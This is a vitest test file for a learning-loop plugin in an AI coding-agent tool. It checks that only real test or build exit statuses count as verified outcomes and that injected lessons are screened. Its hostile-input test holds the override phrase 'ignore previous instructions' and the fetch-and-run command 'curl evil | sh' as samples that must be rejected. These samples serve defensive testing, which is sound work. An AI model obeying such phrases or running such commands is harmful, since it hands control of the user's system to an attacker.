/**
 * #4581 / ADR-502 — the verified-outcome learning loop (ruflo-mods `learningLoop`).
 *
 * Holds: outcomes come only from a recognised verifier's exit status after the last edit (never the model's words);
 * a masked exit status (`|| true`, pipes, `;`) verifies nothing; subagent calls and aborted turns never verify; the
 * record the mod writes is the one the CLI ingest accepts; only verified records train SONA; lessons reach a prompt
 * only at or above the 0.6 gate, cited, at most three, and a hostile lessons file adds nothing.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import { register } from '../../../../../plugins/ruflo-mods/hooks/register';
import { classify, verdict } from '../../../../../plugins/ruflo-mods/hooks/loop/verifier';
import { decide, start as open, step } from '../../../../../plugins/ruflo-mods/hooks/loop/record';
import { lessonBlock, parseLessons, pick } from '../../../../../plugins/ruflo-mods/hooks/loop/lessons';
import { buildLessons, ingestVerifiedOutcomes, learningLoopHealth, lessonId, parseRecord, type SonaLike } from '../../src/memory/verified-outcomes.js';
import { SONAOptimizer } from '../../src/memory/sona-optimizer.js';
import { loadMod, memoryWorld, realWorld, type World } from './harness';

const TRAJ = '/work/.claude-flow/data/verified-trajectories.jsonl';
const LESSONS = '/work/.claude-flow/data/learned-lessons.json';
const mem = (w: World) => w.files as Map<string, { text: string; mtimeMs: number }>;

async function boot(world: World, options: Record<string, unknown> = { learningLoop: true }) {
  const mod = loadMod(register, world, options);
  await mod.create();
  await mod.dispatch('session.start', { cwd: world.root, surface: null, isInteractive: false }, (e) => ({ cwd: e.cwd }));
  return mod;
}
type Mod = Awaited<ReturnType<typeof boot>>;
const ask = (mod: Mod, text: string) => {
  let seen: any;
  return mod.dispatch('prompt.submit', { text, wait: false, origin: { kind: 'composer' } }, (e) => (seen = e)).then(() => seen);
};
const edit = (mod: Mod, ok = true, extra: object = {}) =>
  mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.ts', ...extra }, () => (ok ? { result: 'ok' } : { result: 'no', isError: true }));
const bash = (mod: Mod, command: string, ok: boolean, out: object = {}, extra: object = {}) =>
  mod.dispatch('tool.call', { tool: 'Bash', command, ...extra }, () => ({ result: { stdout: '', stderr: '', interrupted: false, ...out }, ...(ok ? {} : { isError: true }) }));
const end = (mod: Mod, extra: object = {}) =>
  mod.dispatch('turn.complete', { answer: 'All tests pass!', durationMs: 5, isAborted: false, turnId: 'u1', ...extra }, () => ({ text: 'All tests pass!' }));
const records = (w: World) => (mem(w).get(TRAJ)?.text ?? '').split('\n').filter(Boolean).map((l) => JSON.parse(l));

describe('verifier classification (pure)', () => {
  it('recognises test, build, typecheck and lint commands, with cd/env setup', () => {
    const cases: Array<[string, string]> = [
      ['npm test', 'test'], ['pnpm test', 'test'], ['yarn test', 'test'], ['npm run test:unit', 'test'],
      ['npm run build', 'build'], ['pnpm -r build', 'build'], ['pnpm --filter @x/y test', 'test'],
      ['npx vitest run __tests__/a.test.ts', 'test'], ['npx tsc --noEmit', 'typecheck'], ['cargo test --workspace', 'test'],
      ['cargo build --release', 'build'], ['cargo clippy -- -D warnings', 'lint'], ['go test ./...', 'test'],
      ['python -m pytest -q', 'test'], ['pytest tests/', 'test'], ['dotnet test', 'test'], ['make test', 'test'],
      ['cd v3 && npm test', 'test'], ['CI=1 npx vitest run', 'test'], ['npm test 2>&1', 'test'],
      ['npm run build && npm test', 'test'], ['export NODE_ENV=test && npm test', 'test'],
    ];
    for (const [cmd, kind] of cases) expect(classify(cmd)?.kind, cmd).toBe(kind);
  });

  it('refuses anything whose exit status could belong to something else', () => {
    for (const cmd of ['npm test || true', 'npm test | tail -5', 'npm test; echo done', 'npm test & sleep 1', 'echo $(npm test)', 'npm test\nexit 0',
      'npm install', 'npm run deploy', 'git commit -m test', 'echo npm test', 'rm -rf x && npm test', 'npm test && rm -rf dist', '`npm test`', 'ls', '']) {
      expect(classify(cmd), cmd).toBeNull();
    }
    for (const bad of [undefined, null, 5, {}, 'x'.repeat(3000)]) expect(classify(bad)).toBeNull();
  });

  it('only a finished, foreground, uninterrupted run has a verdict', () => {
    expect(verdict({ result: { interrupted: false } })).toBe(true);
    expect(verdict({ result: { interrupted: false }, isError: true })).toBe(false);
    expect(verdict({ result: { interrupted: true } })).toBeNull();
    expect(verdict({ result: { backgroundTaskId: 'b1' } })).toBeNull();
    expect(verdict({ result: { timedOutAfterMs: 1000 } })).toBeNull();
    expect(verdict({ deny: 'no' })).toBeNull();
  });

  it('decides on the runs after the last edit; a run before an edit, or with no edit at all, verifies nothing', () => {
    const t = open('vt-a', 'fix the parser', 'coder', 1);
    step(t, 'Bash', true, { kind: 'test', command: 'npm test' }, true);
    expect(decide(t, false).outcome).toBe('unknown'); // nothing changed
    step(t, 'Edit', true, null, null);
    expect(decide(t, false).outcome).toBe('unknown');
    step(t, 'Bash', true, { kind: 'build', command: 'npm run build' }, true);
    step(t, 'Bash', false, { kind: 'test', command: 'npm test' }, false);
    expect(decide(t, false)).toMatchObject({ outcome: 'verified-failure', run: { command: 'npm test' } });
    step(t, 'Edit', true, null, null);
    step(t, 'Bash', true, { kind: 'test', command: 'npm test' }, true);
    expect(decide(t, false).outcome).toBe('verified-success');
    expect(decide(t, true).outcome).toBe('unknown');
  });

  it('stores a task that carries a secret shape as [redacted]', () => {
    expect(open('vt-b', 'use key AKIAIOSFODNN7EXAMPLE to deploy', 'coder', 1).task).toBe('[redacted]');
    expect(open('vt-c', 'email jane.doe@example.com the parser fix', 'coder', 1).task).toBe('email [email] the parser fix');
  });
});

describe('learningLoop in the mod', () => {
  it('is on by default, off when set false, and inert outside a ruflo project', async () => {
    const on = memoryWorld();
    const d = await boot(on, {});
    await ask(d, 'fix the parser');
    await edit(d);
    await bash(d, 'npm test', true);
    await end(d);
    expect(records(on).map((x) => x.outcome)).toEqual(['verified-success']);

    const off = memoryWorld();
    const a = await boot(off, { learningLoop: false });
    await ask(a, 'fix the parser');
    await edit(a);
    await bash(a, 'npm test', true);
    await end(a);
    expect(mem(off).has(TRAJ)).toBe(false);

    const bare = memoryWorld();
    bare.dirs.delete('/work/.claude-flow');
    const b = await boot(bare);
    await ask(b, 'fix the parser');
    await edit(b);
    await bash(b, 'npm test', true);
    await end(b);
    expect(mem(bare).has(TRAJ)).toBe(false);
  });

  it('records verified success, verified failure and unknown from exit status only', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    await ask(mod, 'implement the tokenizer');
    await edit(mod);
    await bash(mod, 'npm test', true);
    await end(mod);

    await ask(mod, 'implement the tokenizer edge cases');
    await edit(mod);
    await bash(mod, 'npx vitest run', false);
    await end(mod);

    // The answer claims success; no verifier ran after the edit, so it is unknown.
    await ask(mod, 'refactor the lexer');
    await edit(mod);
    await end(mod);

    // A masked exit status verifies nothing.
    await ask(mod, 'refactor the lexer again');
    await edit(mod);
    await bash(mod, 'npm test || true', true);
    await end(mod);

    const r = records(world);
    expect(r.map((x) => x.outcome)).toEqual(['verified-success', 'verified-failure', 'unknown', 'unknown']);
    expect(r[0]).toMatchObject({ v: 1, agent: 'coder', verifier: { kind: 'test', command: 'npm test', passed: true }, edits: 1 });
    expect(r[0].steps).toEqual([{ tool: 'Edit', ok: true }, { tool: 'Bash', ok: true }]);
    for (const x of r) expect(parseRecord(JSON.stringify(x)), x.id).not.toBeNull();
    expect(world.statuses.at(-1)).toContain('loop ✓1 ✗1 ?2');
  });

  it('ignores subagent calls and turns, aborted turns are unknown, tool-less turns are not recorded', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    await ask(mod, 'fix the parser');
    await edit(mod);
    await bash(mod, 'npm test', true, {}, { agentId: 'sub-1' });
    await end(mod, { agentId: 'sub-1' });
    await end(mod);
    expect(records(world).map((x) => x.outcome)).toEqual(['unknown']);

    await ask(mod, 'fix the parser');
    await edit(mod);
    await bash(mod, 'npm test', true);
    await end(mod, { isAborted: true });
    await ask(mod, 'what is a parser?');
    await end(mod);
    await ask(mod, '/ruflo-mods');
    await edit(mod);
    await end(mod);
    expect(records(world).map((x) => x.outcome)).toEqual(['unknown', 'unknown']);
  });

  it('never denies, rewrites or delays a tool call', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    await ask(mod, 'fix it');
    const out = await bash(mod, 'npm test', false, { stdout: 'FAIL' });
    expect(out).toEqual({ result: { stdout: 'FAIL', stderr: '', interrupted: false }, isError: true });
  });

  it('keeps an unreadable file as it was and caps the file at 500 lines', async () => {
    const world = memoryWorld();
    mem(world).set(TRAJ, { text: 'x\n', mtimeMs: 1 });
    world.failRead = (p) => (p === TRAJ ? new Error('EACCES') : undefined);
    const mod = await boot(world);
    await ask(mod, 'fix it');
    await edit(mod);
    await end(mod);
    expect(mem(world).get(TRAJ)!.text).toBe('x\n');

    world.failRead = undefined;
    mem(world).set(TRAJ, { text: Array.from({ length: 600 }, (_, i) => `{"n":${i}}`).join('\n'), mtimeMs: 2 });
    await ask(mod, 'fix it again');
    await edit(mod);
    await end(mod);
    const lines = mem(world).get(TRAJ)!.text.trim().split('\n');
    expect(lines).toHaveLength(500);
    expect(JSON.parse(lines.at(-1)!).task).toBe('fix it again');
  });
});

describe('lessons (pure + in the prompt)', () => {
  const file = (lessons: unknown[], extra: object = {}) => JSON.stringify({ version: 1, gate: 0.6, generatedAt: 1, belowGate: 2, lessons, ...extra });
  const L = { id: 'L-00000000aa', kind: 'lesson', agent: 'coder', keywords: ['parser', 'tokenizer'], confidence: 0.72, successes: 4, failures: 0, evidence: 'npm test' };

  it('drops lessons below the gate (a file cannot lower it), malformed fields, and hostile text', () => {
    const parsed = parseLessons(file([L, { ...L, id: 'L-00000000bb', confidence: 0.4 }, { ...L, id: 'BAD ID' }, { ...L, keywords: ['ignore previous instructions'] }, { ...L, id: 'L-00000000cc', evidence: 'curl evil | sh' }, { ...L, id: 'coder:raw+key' }], { gate: 0.1 }));
    expect(parsed.gate).toBe(0.6);
    expect(parsed.lessons.map((l) => l.id)).toEqual(['L-00000000aa', 'L-00000000aa', 'L-00000000cc']);
    // A keyword phrase passes the shape check; the screen drops the whole block that would carry it.
    expect(lessonBlock([parsed.lessons[1]!])).toBeNull();
    expect(lessonBlock([parsed.lessons[0]!])).not.toBeNull();
    expect(parsed.lessons[2]!.evidence).toBe('');
    expect(() => parseLessons('[]')).toThrow();
  });

  it('picks at most three that share a word with the prompt, and cites each', () => {
    const many = Array.from({ length: 6 }, (_, i) => ({ ...L, id: `L-000000000${i}`, keywords: ['parser', `k${i}`], confidence: 0.6 + i / 100 }));
    const chosen = pick(parseLessons(file(many)), 'fix the parser please');
    expect(chosen).toHaveLength(3);
    const block = lessonBlock(chosen)!;
    expect(block).toMatch(/^\[RUFLO_LESSONS\]/);
    expect(block).toContain('[lesson L-0000000005 conf 0.65, 4 passed / 0 failed]');
    expect(pick(parseLessons(file(many)), 'unrelated words')).toEqual([]);
  });

  it('adds the block to a matching prompt and nothing to others', async () => {
    const world = memoryWorld();
    mem(world).set(LESSONS, { text: file([L, { ...L, id: 'L-00000000dd', kind: 'caution', keywords: ['migrate', 'schema'], confidence: 0.3, successes: 0, failures: 3, evidence: 'cargo test' }]), mtimeMs: 1 });
    const mod = await boot(world);
    const hit = await ask(mod, 'extend the tokenizer');
    expect(hit.context.join('\n')).toContain('went to coder and passed `npm test`');
    const caution = await ask(mod, 'migrate the schema');
    expect(caution.context.join('\n')).toContain('failed `cargo test` 3 times');
    const miss = await ask(mod, 'write a poem');
    expect((miss.context ?? []).join('\n')).not.toContain('RUFLO_LESSONS');
  });
});

describe('CLI ingest (#4581): only verified records train', () => {
  let dir: string;
  afterEach(() => dir && rmSync(dir, { recursive: true, force: true }));

  const fakeSona = () => {
    const calls: Array<{ task: string; agent: string; success: boolean }> = [];
    const sona: SonaLike = {
      processTrajectoryOutcome: (o) => (calls.push({ task: o.task, agent: o.agent, success: o.success }), { learned: true, patternKey: `${o.agent}:k`, confidence: 0.7 }),
      exportPatterns: () => ({ 'coder:k': { keywords: ['k'], agent: 'coder', confidence: 0.7, successCount: 2, failureCount: 0 } }),
    };
    return { sona, calls };
  };
  const rec = (id: string, outcome: string, over: object = {}) =>
    JSON.stringify({ v: 1, id, task: 'implement the parser', agent: 'backend-dev', outcome, verifier: outcome === 'unknown' ? null : { kind: 'test', command: 'npm test', passed: outcome === 'verified-success' }, steps: [{ tool: 'Edit', ok: true }], edits: 1, startedAt: 1, endedAt: 2, ...over });
  const seed = (lines: string[]) => {
    dir = mkdtempSync(join(tmpdir(), 'vo-4581-'));
    mkdirSync(join(dir, '.claude-flow', 'data'), { recursive: true });
    writeFileSync(join(dir, '.claude-flow/data/verified-trajectories.jsonl'), lines.join('\n') + '\n');
  };

  it('trains verified records once, counts unknown, rejects malformed and inconsistent ones', async () => {
    // Two sessions, so the ADR-503 one-session hold does not apply to the lesson below.
    seed([rec('vt-1', 'verified-success', { session: 's-a' }), rec('vt-2', 'verified-failure'), rec('vt-3', 'unknown'), 'nope', rec('vt-4', 'verified-success', { verifier: null }), rec('vt-5', 'verified-success', { verifier: { kind: 'test', command: 'npm test', passed: false } }), rec('vt-6', 'verified-success', { extra: 'x', v: 2 }), rec('vt-7', 'verified-success', { session: 's-b' })]);
    const { sona, calls } = fakeSona();
    const first = await ingestVerifiedOutcomes({ root: dir, sona, force: true });
    expect(first.ingested).toEqual({ verifiedSuccess: 2, verifiedFailure: 1, unknown: 1, rejected: 4, tainted: 0 });
    expect(calls.map((c) => [c.success, c.agent])).toEqual([[true, 'coder'], [false, 'coder'], [true, 'coder']]); // backend-dev is not a SONA role
    const again = await ingestVerifiedOutcomes({ root: dir, sona, force: true });
    expect(again.trained).toBe(0);
    expect(calls).toHaveLength(3);
    const lessons = JSON.parse(readFileSync(join(dir, '.claude-flow/data/learned-lessons.json'), 'utf8'));
    expect(lessons.lessons).toEqual([expect.objectContaining({ id: lessonId('coder:k'), kind: 'lesson', evidence: 'npm test' })]);
    expect(learningLoopHealth(dir).status).toBe('pass');
  });

  it('leaves verified records for later when SONA is unavailable, and the doctor says so', async () => {
    seed([rec('vt-1', 'verified-success')]);
    const r = await ingestVerifiedOutcomes({ root: dir, sona: null, force: true });
    expect(r.trained).toBe(0);
    expect(learningLoopHealth(dir)).toMatchObject({ status: 'warn' });
    const { sona, calls } = fakeSona();
    await ingestVerifiedOutcomes({ root: dir, sona });
    expect(calls).toHaveLength(1);
  });

  it('dry run trains and writes nothing', async () => {
    seed([rec('vt-1', 'verified-success')]);
    const { sona, calls } = fakeSona();
    const r = await ingestVerifiedOutcomes({ root: dir, sona, dryRun: true });
    expect(r.ingested.verifiedSuccess).toBe(1);
    expect(calls).toHaveLength(0);
    expect(existsSync(join(dir, '.claude-flow/data/verified-ingest.json'))).toBe(false);
  });

  it('redacts PII from the task before SONA sees it', async () => {
    seed([rec('vt-1', 'verified-success', { task: 'email jane.doe@example.com about the parser' })]);
    const { sona, calls } = fakeSona();
    await ingestVerifiedOutcomes({ root: dir, sona, force: true });
    expect(calls[0]!.task).not.toContain('jane.doe@example.com');
  });

  it('buildLessons keeps only verified patterns; repeated verified failures become cautions', () => {
    const patterns = {
      'coder:a': { keywords: ['a'], agent: 'coder', confidence: 0.8, successCount: 3, failureCount: 0 },
      'coder:b': { keywords: ['b'], agent: 'coder', confidence: 0.3, successCount: 0, failureCount: 3 },
      'coder:c': { keywords: ['c'], agent: 'coder', confidence: 0.55, successCount: 1, failureCount: 0 },
      'coder:unverified': { keywords: ['u'], agent: 'coder', confidence: 0.95, successCount: 9, failureCount: 0 },
    };
    const stats = (successes: number, failures: number) => ({ successes, failures, tainted: 0, narrowed: 0, sessions: ['s-a', 's-b'] });
    const v = { 'coder:a': { evidence: 'npm test', at: 1, stats: stats(3, 0) }, 'coder:b': { evidence: 'cargo test', at: 1, stats: stats(0, 3) }, 'coder:c': { evidence: 'npm test', at: 1, stats: stats(1, 0) } };
    const out = buildLessons(patterns, v, 1);
    expect(out.lessons.map((l) => [l.id, l.kind])).toEqual([[lessonId('coder:a'), 'lesson'], [lessonId('coder:b'), 'caution']]);
    expect(out.belowGate).toBe(1);
  });
});

describe('end to end: mod record → CLI ingest with real SONA → lesson in the next prompt', () => {
  let dir: string;
  afterEach(() => dir && rmSync(dir, { recursive: true, force: true }));

  it('three verified passes on the same kind of task, over two sessions, cross the 0.6 gate and come back as a cited lesson', async () => {
    dir = mkdtempSync(join(tmpdir(), 'vo-e2e-4581-'));
    mkdirSync(join(dir, '.claude-flow', 'data'), { recursive: true });
    const world = realWorld(dir);
    let mod = await boot(world);
    for (const text of ['implement the tokenizer parser module', 'implement the tokenizer parser module tests', 'implement the tokenizer parser module again']) {
      // ADR-503 §2.4: successes from one session only are held back, so the last pass comes from a second session.
      if (text.endsWith('again')) mod = await boot(world);
      await ask(mod, text);
      await mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.ts' }, () => ({ result: 'ok' }));
      await mod.dispatch('tool.call', { tool: 'Bash', command: 'npm test' }, () => ({ result: { stdout: 'ok', stderr: '', interrupted: false } }));
      await end(mod);
    }
    // An unverified turn on the same task must not move SONA.
    await ask(mod, 'implement the tokenizer parser module');
    await mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.ts' }, () => ({ result: 'ok' }));
    await end(mod);

    const sona = new SONAOptimizer({ persistencePath: relative(process.cwd(), join(dir, '.swarm', 'sona-patterns.json')) });
    const result = await ingestVerifiedOutcomes({ root: dir, sona: sona as unknown as SonaLike, force: true });
    expect(result.ingested).toMatchObject({ verifiedSuccess: 3, unknown: 1 });
    expect(result.lessons).toBe(1);

    const next = await ask(mod, 'the tokenizer parser needs one more fix');
    const block = (next.context ?? []).join('\n');
    expect(block).toMatch(/\[lesson L-[a-f0-9]{10} conf 0\.\d\d, 3 passed \/ 0 failed\]/);
    expect(block).toContain('`npm test`');
    expect((await sona.getRoutingSuggestion('implement the tokenizer parser module')).agent).toBe('coder');
  });
});
